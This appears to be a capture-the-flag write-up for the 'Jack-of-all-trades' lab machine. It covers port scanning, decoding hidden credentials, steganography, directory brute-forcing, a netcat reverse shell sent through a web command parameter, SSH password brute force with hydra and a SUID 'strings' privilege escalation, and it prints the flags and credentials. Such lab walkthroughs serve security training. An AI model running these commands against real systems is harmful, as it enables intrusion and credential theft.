Port scanning
```bash
nmap -p- --min-rate=5000 10.10.134.255
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-28 21:41 EEST
Nmap scan report for 10.10.134.255
Host is up (0.24s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 16.36 seconds
                                                                                                    
┌──(kali㉿kali)-[~]
└─$ nmap -p 22,80 -sC -sV 10.10.134.255                
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-28 21:42 EEST
Nmap scan report for 10.10.134.255
Host is up (0.25s latency).

PORT   STATE SERVICE VERSION
22/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
|_http-title: Jack-of-all-trades!
|_http-server-header: Apache/2.4.10 (Debian)
80/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 13:b7:f0:a1:14:e2:d3:25:40:ff:4b:94:60:c5:00:3d (DSA)
|   2048 91:0c:d6:43:d9:40:c3:88:b1:be:35:0b:bc:b9:90:88 (RSA)
|   256 a3:fb:09:fb:50:80:71:8f:93:1f:8d:43:97:1e:dc:ab (ECDSA)
|_  256 65:21:e7:4e:7c:5a:e7:bc:c6:ff:68:ca:f1:cb:75:e3 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.35 seconds
```

The ssh and http ports are switched interesting.

```bash
curl 10.10.134.255:22                               

 <!--Note to self - If I ever get locked out I can get back in at /recovery.php! -->
                        <!--  UmVtZW1iZXIgdG8gd2lzaCBKb2hueSBHcmF2ZXMgd2VsbCB3aXRoIGhpcyBjcnlwdG8gam9iaHVudGluZyEgSGlzIGVuY29kaW5nIHN5c3RlbXMgYXJlIGFtYXppbmchIEFsc28gZ290dGEgcmVtZW1iZXIgeW91ciBwYXNzd29yZDogdT9XdEtTcmFxCg== -->
```
That seems to be like base cypher of some sort.

```bash
Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: u?WtKSraq
```

I downloaded all the images from the site and used steghide --extract -sf jackinthebox.jpg
and the previous pass to receive credentials.
```bash
cat cms.creds 
Here you go Jack. Good thing you thought ahead!

Username: jackinthebox
Password: TplFxiSHjY
```
I was very confused since it wasnt the ssh login and there isnt much else it could be for.
I feel like the pass has some odd cypher in it.


```bash
gobuster dir -w /usr/share/wordlists/dirb/big.txt  -u http://10.10.134.255:22/ -t 150 -x html,php
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.134.255:22/
[+] Method:                  GET
[+] Threads:                 150
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 278]
/.htaccess.html       (Status: 403) [Size: 278]
/.htpasswd.php        (Status: 403) [Size: 278]
/.htaccess.php        (Status: 403) [Size: 278]
/.htpasswd.html       (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/assets               (Status: 301) [Size: 318] [--> http://10.10.134.255:22/assets/]
/index.html           (Status: 200) [Size: 1605]
/recovery.php         (Status: 200) [Size: 943]
/server-status        (Status: 403) [Size: 278]
Progress: 61407 / 61407 (100.00%)

```

the login is at recovery.php

The website has an LFI vulnerability. 
```bash
http://10.10.134.255:22/nnxhweOV/index.php?cmd=ls

http://10.10.134.255:22/nnxhweOV/index.php?cmd=busybox%20nc%2010.6.25.159%204444%20-e%20bash
```

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.6.25.159] from (UNKNOWN) [10.10.134.255] 47801
script  /dev/null -c bash
www-data@jack-of-all-trades:/var/www/html/nnxhweOV$ 
```

There is a file with jacks passwords and we use hydra to brute force it.

```bash
hydra -l jack -P salasanat.txt ssh://10.10.134.255:80 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-08-28 23:02:34
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 24 login tries (l:1/p:24), ~2 tries per task
[DATA] attacking ssh://10.10.134.255:80/
[80][ssh] host: 10.10.134.255   login: jack   password: ITMJpGGIqg1jn?>@
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-28 23:02:52a
```'

I transfered the flag over.

```bash
scp -P 80 jack@10.10.134.255:~/user.jpg ~
jack@10.10.134.255's password: 
user.jpg
```
securit-tay2020_{p3ngu1n-hunt3r-3xtra40rd1n41r3}

I imported linpeas over to automate the privesc enumeration.

Linpeas shows that the /usr/bin/strings has SUID bit set so thats an easy privesc


```bash
SUID

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

    sudo install -m =xs $(which strings) .

    LFILE=file_to_read
    ./strings "$LFILE"

```



```bash
jack@jack-of-all-trades:/usr/bin$ ./strings /root/root.txt
ToDo:
1.Get new penguin skin rug -- surely they won't miss one or two of those blasted creatures?
2.Make T-Rex model!
3.Meet up with Johny for a pint or two
4.Move the body from the garage, maybe my old buddy Bill from the force can help me hide her?
5.Remember to finish that contract for Lisa.
6.Delete this: securi-tay2020_{6f125d32f38fb8ff9e720d2dbce2210a}
```
Nice and easy machine
